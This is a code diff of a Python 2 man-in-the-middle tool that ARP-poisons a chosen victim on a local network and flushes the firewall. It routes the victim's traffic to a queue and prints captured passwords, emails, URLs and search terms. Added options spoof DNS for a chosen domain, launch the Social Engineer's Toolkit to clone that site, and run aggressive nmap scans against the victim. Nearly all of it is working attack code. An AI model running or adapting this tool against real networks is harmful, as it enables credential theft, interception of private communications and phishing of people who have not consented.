@@ -1,10 +1,22 @@
 #!/usr/bin/python
 
 '''
-ADD wifi-monitor TO IT IF NO -ip OPTION EXISTS
+Description:	MITMs another LAN client and prints all the interesting unencrypted info like passwords and messages. Asynchronous multithreaded arp spoofing packet parser.
+Author:			Dan McInerney
+Contact:		danhmcinerney gmail
+
+Prerequisites:	Linux
+					nmap (optional)
+					nbtscan (optional)
+					aircrack-ng
+				Python 2.6+
+					nfqueue-bindings
+					scapy
+					twisted
+
+Note: 			This script flushes iptables before and after usage.
 '''
 
-#from logging import getLogger
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
@@ -28,10 +40,12 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -v to print all URLs and without truncation.", action="store_true")
 parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets.")
 parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
-parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip.", action="store_true")
 parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
-parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument.")
-parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP passwords for you.", action="store_true")
+parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. An argument like [facebook.com] will match all subdomains of facebook.com")
+parser.add_argument("-set", "--setoolkit", help="Start Social Engineer's Toolkit in another window.", action="store_true")
+parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP username/password combos for you.", action="store_true")
+parser.add_argument("-na", "--nmapaggressive", help="Aggressively scan the target for open ports and services in the background. Output to ip.add.re.ss.log.txt where ip.add.re.ss is the victim's IP.", action="store_true")
+parser.add_argument("-n", "--nmap", help="Scan the target for open ports prior to starting to sniffing their packets.", action="store_true")
 parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
 args = parser.parse_args()
 
@@ -106,7 +120,7 @@ class Parser():
 						self.ftp(load, IP_dst, IP_src)
 					if dport == 80 or sport == 80:
 						self.URL(load, ack, dport, sport)
-		if args.dnsspoof or args.dnsspoofall:
+		if args.dnsspoof:
 			if pkt.haslayer(DNSQR):
 				dport = pkt[UDP].dport
 				sport = pkt[UDP].sport
@@ -153,7 +167,6 @@ class Parser():
 			headers = load
 			body = ''
 
-		# Split the packet between headers and body and grab the URL from the headers
 		# If you see any other login/pw variable names, tell me and I'll add em in here
 		# As it stands now this has a moderately high false positive rate; I figured better to err on the site of more data than less
 		# email, user, username, name, login, log, loginID
@@ -196,13 +209,16 @@ class Parser():
 				logger.write('[*] '+url+'\n')
 
 			# Catch search terms
-			# As it stands now this has a moderately high false positive rate mostly due to the very simple ?s= and ?q= vars
+			# As it stands now this has a moderately high false positive rate mostly due to the common ?s= and ?q= vars
 			# I figured better to err on the site of more data than less and it's easy to tell the false positives from the real searches
-			# search, query, search?q, ?s, &q, ?q, search?p, keywords, command
-			searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|keywords|command)=([^&][^&]*))', url)
+			# search, query, search?q, ?s, &q, ?q, search?p, searchTerm, keywords, command
+			searched = re.search('((search|query|search\?q|\?s|&q|\?q|search\?p|search[Tt]erm|keywords|command)=([^&][^&]*))', url)
 			if searched:
 				searched = searched.group(3)
+				# Common false positives
 				if 'select%20*%20from' in searched:
+					pass
+				if host == 'geo.yahoo.com':
 					pass
 				else:
 					searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
@@ -340,13 +356,13 @@ class Parser():
 		header_lines = headers.split(r"\r\n")
 		email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']
 
-#		Find passwords
+		# Find passwords
 		if dport in [25, 26, 110, 143]:
 			self.passwords(IP_src, load, dport, IP_dst)
-#		Find outgoing messages
+		# Find outgoing messages
 		if dport == 26 or dport == 25:
 			self.outgoing(load, body, header_lines, email_headers, IP_src)
-#		Find incoming messages
+		# Find incoming messages
 		if sport in [110, 143]:
 			self.incoming(headers, body, header_lines, email_headers, sport, dport)
 
@@ -405,7 +421,7 @@ class Parser():
 				for x in email_headers:
 					if x in l:
 						self.OheadersFound.append(l)
-			# if date, from, to in headers then print the message
+			# if date, from, to, in headers then print the message
 			if len(self.OheadersFound) > 3 and body != '':
 				if self.mailfragged == 1:
 					print O+'[!] OUTGOING MESSAGE (fragmented)'+W
@@ -487,7 +503,7 @@ class Queued(object):
 		self.q.set_queue_maxlen(5000)
 		reactor.addReader(self)
 		self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
-		print '[*] Queue started; waiting for data\n'
+		print '[*] Flushed firewall and forwarded traffic to the queue; waiting for data'
 	def fileno(self):
 		return self.q.get_fd()
 	def doRead(self):
@@ -497,72 +513,181 @@ class Queued(object):
 	def logPrefix(self):
 		return 'queued'
 
-class Threads():
+class active_users():
 
-	def sslstrip(self, DN):
-		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
-		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
-		xterm = ['xterm', '-e', 'sslstrip', '-f', '-w', 'sslstrip.txt']
-		Popen(xterm, stdout=PIPE, stderr=DN)
+	IPandMAC = []
+	start_time = time.time()
+	current_time = 0
+	monmode = ''
 
-	def driftnet(self, interface, DN):
-		xterm = ['xterm', '-e', 'driftnet', '-i', '%s' % interface]
-		Popen(xterm, stdout=PIPE, stderr=DN)
+	def pkt_cb(self, pkt):
+		if pkt.haslayer(Dot11):
+			pkt = pkt[Dot11]
+			if pkt.type == 2:
+				addresses = [pkt.addr1.upper(), pkt.addr2.upper(), pkt.addr3.upper()]
+				for x in addresses:
+					for y in self.IPandMAC:
+						if x in y[1]:
+							y[2] = y[2]+1
+				self.current_time = time.time()
+			if self.current_time > self.start_time+1:
+				self.IPandMAC.sort(key=lambda x: float(x[2]), reverse=True) # sort by data packets
+				os.system('/usr/bin/clear')
+				print '    IP	        Data'
+				for x in self.IPandMAC:
+					if len(x) == 3:
+						ip = x[0].ljust(10)
+						data = str(x[2]).rjust(8)
+						print ip, data
+					else:
+						ip = x[0].ljust(10)
+						data = str(x[2]).rjust(8)
+						print ip, data, x[3]
+				print '\n[*] Hit Ctrl-C at any time to stop and choose a victim IP'
+				self.start_time = time.time()
 
-	def start_threads(self, interface, DN):
+	def users(self, IPprefix, routerIP, DN):
 
-		#start twisted reactor in thread
-		rt = Thread(target=reactor.run, args=(False,)) #reactor must be started without signal handling since it's not in the main thread
-		rt.daemon = True
-		rt.start()
+		print '[*] Running ARP scan to identify users on the network; this may take a minute...'
+		iplist = []
+		maclist = []
+		try:
+			nmap = Popen(['/usr/bin/nmap', '-sn', IPprefix], stdout=PIPE, stderr=DN)
+			nmap = nmap.communicate()[0]
+			nmap = nmap.splitlines()[2:-1]
+		except:
+			print '[-] Nmap ARP scan failed, is it nmap installed?'
+		for x in nmap:
+			if 'Nmap' in x:
+				nmapip = x.split()[4]
+				iplist.append(nmapip)
+			if 'MAC' in x:
+				nmapmac = x.split()[2]
+				maclist.append(nmapmac)
+		zipped = zip(iplist, maclist)
+		self.IPandMAC = [list(item) for item in zipped]
 
-		if args.driftnet:
-			dr = Thread(target=self.driftnet, args=(interface, DN))
-			dr.daemon = True
-			dr.start()
-		if args.sslstrip:
-			ssl = Thread(target=self.sslstrip, args=(DN,))
-			ssl.daemon = True
-			ssl.start()
+		# Make sure router is caught in the arp ping
+		r = 0
+		for i in self.IPandMAC:
+			i.append(0)
+			if r == 0:
+				if routerIP == i[0]:
+					i.append('router')
+					routerMAC = i[1]
+					r = 1
+		if r == 0:
+			exit('[-] Router MAC not found. Exiting.')
+
+		# Do nbtscan for windows netbios names
+		print '[*] Running nbtscan to get Windows netbios names'
+		try:
+			nbt = Popen(['nbtscan', IPprefix], stdout=PIPE, stderr=DN)
+			nbt = nbt.communicate()[0]
+			nbt = nbt.splitlines()
+			nbt = nbt[4:]
+		except:
+			print '[-] nbtscan error, are you sure it is installed?'
+		for l in nbt:
+			try:
+				l = l.split()
+				nbtip = l[0]
+				nbtname = l[1]
+			except:
+				print '[-] Could not find any netbios names. Continuing without them'
+			if nbtip and nbtname:
+				for a in self.IPandMAC:
+					if nbtip in a[0]:
+						a.append(nbtname)
+
+		# Start monitor mode
+		print '[*] Enabling monitor mode'
+		try:
+			promiscSearch = Popen(['/usr/sbin/airmon-ng', 'start', '%s' % interface], stdout=PIPE, stderr=DN)
+			promisc = promiscSearch.communicate()[0]
+			monmodeSearch = re.search('monitor mode enabled on (.+)\)', promisc)
+			self.monmode = monmodeSearch.group(1)
+		except OSError, e:
+			exit('[-] Enabling monitor mode failed, do you have aircrack-ng installed?')
+
+		sniff(iface=self.monmode, prn=self.pkt_cb, store=0)
+
 
 #Print all the variables
-def print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
+def print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
 	print "[*] Active interface: " + interface
 	print "[*] DHCP server: " + DHCPsrvr
 	print "[*] DNS server: " + dnsIP
 	print "[*] Local domain: " + local_domain
 	print "[*] Router IP: " + routerIP
-	print "[*] victim IP: " + victimIP
+	print "[*] Victim IP: " + victimIP
 	logger.write("[*] Router IP: " + routerIP+'\n')
 	logger.write("[*] victim IP: " + victimIP+'\n')
 
 #Enable IP forwarding and flush possibly conflicting iptables rules
 def setup(DN, victimMAC):
-	ipfwd = Popen(['cat', '/proc/sys/net/ipv4/ip_forward'], stdout=PIPE, stderr=DN)
+	ipfwd = Popen(['/bin/cat', '/proc/sys/net/ipv4/ip_forward'], stdout=PIPE, stderr=DN)
 	if ipfwd.communicate()[0] != '1\n':
 		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
 		ipf.write('1\n')
 		ipf.close()
 		print '[*] Enabled IP forwarding'
-	os.system('iptables -F')
-	os.system('iptables -X')
-	os.system('iptables -t nat -F')
-	os.system('iptables -t nat -X')
-	print '[*] Flushed the firewall'
-	# PREROUTING is a rule that will be needed to be added when code injection is added to this script
-#	os.system('iptables -t nat -A PREROUTING -p tcp -s %s -j NFQUEUE' % victimIP)
-#	os.system('iptables -t nat -A PREROUTING -p tcp -d %s -j NFQUEUE' % victimIP)
+	os.system('/sbin/iptables -F')
+	os.system('/sbin/iptables -X')
+	os.system('/sbin/iptables -t nat -F')
+	os.system('/sbin/iptables -t nat -X')
 	# Just throw packets that are from and to the victim into the reactor
-	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
-	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
-	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
-	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
+	os.system('/sbin/iptables -A FORWARD -p tcp -s %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
+	os.system('/sbin/iptables -A FORWARD -p tcp -d %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
+	os.system('/sbin/iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
+	os.system('/sbin/iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
 	# To catch DNS packets you gotta do prerouting rather than forward for some reason?
-	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
-	print '[*] Forwarded traffic to the queue'
+	os.system('/sbin/iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
+
+# Start threads
+def threads():
+
+	rt = Thread(target=reactor.run, args=(False,)) #reactor must be started without signal handling since it's not in the main thread
+	rt.daemon = True
+	rt.start()
+
+	if args.driftnet:
+		dr = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/driftnet -i '+interface+' >/dev/null 2>&1',))
+		dr.daemon = True
+		dr.start()
+
+	if args.dnsspoof and not args.setoolkit:
+		setoolkit = raw_input('[*] You are DNS spoofing '+args.dnsspoof+', would you like to start the Social Engineer\'s Toolkit for easy exploitation? [y/n]: ')
+		if setoolkit == 'y':
+			print '[*] Starting SEtoolkit. To clone '+args.dnsspoof+' hit options 1, 2, 3, 2, then enter '+args.dnsspoof
+			try:
+				se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
+				se.daemon = True
+				se.start()
+			except:
+				print '[-] Could not open SEToolkit, is it installed? Continuing as normal without it.'
+
+	if args.nmapaggressive:
+		print '[*] Starting '+R+'aggressive scan [nmap -T4 -A -v -Pn -oN '+victimIP+W+'] in background; results will be in a file '+victimIP+'.nmap.txt'
+		try:
+			n = Thread(target=os.system, args=('nmap -T4 -A -v -Pn -oN '+victimIP+'.nmap.txt '+victimIP+' >/dev/null 2>&1',))
+			n.daemon = True
+			n.start()
+		except:
+			print '[-] Aggressive Nmap scan failed, is nmap installed?'
+
+	if args.setoolkit:
+		print '[*] Starting SEtoolkit'
+		try:
+			se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
+			se.daemon = True
+			se.start()
+		except:
+			print '[-] Could not open SEToolkit, continuing without it.'
+
 
 def main():
-	global victimIP
+	global victimIP, interface
 
 	#Check if root
 	if not geteuid()==0:
@@ -570,26 +695,25 @@ def main():
 
 	DN = open(devnull, 'w')
 
-	if args.ipaddress:
-		victimIP = args.ipaddress
-	else:
-		ans,unans = arping(IPprefix+'*')
-		for s,r in ans:
-			ips = r.sprintf("%ARP.hwsrc% %ARP.psrc%")
-			print ips
-		victimIP = raw_input('\nType victim\'s IP: ')
-		print ''
-
 	#Find the gateway and interface
-	ipr = Popen(['ip', 'route'], stdout=PIPE, stderr=DN)
+	ipr = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
 	ipr = ipr.communicate()[0]
-	routerRE = re.search('default via ((\d{2,3}\.\d{1,3}\.\d{1,4}\.)\d{1,3}) \w+ (\w[a-zA-Z0-9]\w[a-zA-Z0-9][0-9]?)', ipr)
-	routerIP = routerRE.group(1)
-	IPprefix = routerRE.group(2)
+	ipr = repr(ipr).split(' ')
+	routerIP = ipr[2]
+	IPprefix = ipr[8][2:]
 	if args.interface:
 		interface = args.interface
 	else:
-		interface = routerRE.group(3)
+		interface = ipr[4]
+
+	if args.ipaddress:
+		victimIP = args.ipaddress
+	else:
+		au = active_users()
+		au.users(IPprefix, routerIP, DN)
+		print '\n[*] Turning off monitor mode'
+		os.system('/usr/sbin/airmon-ng stop %s >/dev/null 2>&1' % au.monmode)
+		victimIP = raw_input('[*] Enter the non-router IP to spoof: ')
 
 	print "[*] Checking the DHCP and DNS server addresses..."
 	# DHCP is a pain in the ass to craft
@@ -618,38 +742,50 @@ def main():
 				if 'name_server' in x:
 					dnsIP = x[1]
 	else:
-		print "[!] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP."
+		print "[-] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP."
 		dnsIP = routerIP
 		DHCPsrvr = routerIP
 		local_domain = 'None'
 
 	# Print the vars
-	print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
+	print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
 	try:
 		routerMAC = Spoof().originalMAC(routerIP)
 		print "[*] Router MAC: " + routerMAC
 		logger.write("[*] Router MAC: "+routerMAC+'\n')
 	except:
-		exit("[!] Could not get router MAC address")
+		exit("[-] Could not get router MAC address")
 	try:
 		victimMAC = Spoof().originalMAC(victimIP)
 		print "[*] Victim MAC: " + victimMAC
 		logger.write("[*] Victim MAC: "+routerMAC+'\n')
 	except:
-		exit("[!] Could not get victim MAC address")
+		exit("[-] Could not get victim MAC address")
 	if dnsIP != routerIP:
 		try:
 			dnsMAC = Spoof().originalMAC(dnsIP)
 			print "[*] DNS server MAC: " + dnsMAC
 		except:
-			print "[!] Could not get DNS server MAC address"
+			print "[-] Could not get DNS server MAC address"
 	if dnsIP == routerIP:
 		dnsMAC = routerMAC
 
 	setup(DN, victimMAC)
 	Queued()
-	th = Threads()
-	th.start_threads(interface, DN)
+	threads()
+
+	if args.nmap:
+		print "\n[*] Running [nmap -T4 -O "+victimIP+"]"
+		try:
+			nmap = Popen(['/usr/bin/nmap', '-T4', '-O', victimIP], stdout=PIPE, stderr=DN)
+			nmap = nmap.communicate()[0]
+			nmap = nmap.splitlines()[3:-4]
+		except:
+			print '[-] Nmap port and OS scan failed, is it installed?'
+		for x in nmap:
+			print '[+]',x
+			logger.write('[+] '+x+'\n')
+	print ''
 
 	# Cleans up if Ctrl-C is caught
 	def signal_handler(signal, frame):
@@ -661,17 +797,17 @@ def main():
 		if not dnsIP == routerIP:
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
-		os.system('iptables -F')
-		os.system('iptables -X')
-		os.system('iptables -t nat -F')
-		os.system('iptables -t nat -X')
+		os.system('/sbin/iptables -F')
+		os.system('/sbin/iptables -X')
+		os.system('/sbin/iptables -t nat -F')
+		os.system('/sbin/iptables -t nat -X')
 		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
 		Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
 		exit(0)
 	signal.signal(signal.SIGINT, signal_handler)
 
 	while 1:
-		#If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
+		# If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
 		if not dnsIP == routerIP:
 			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
 		Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
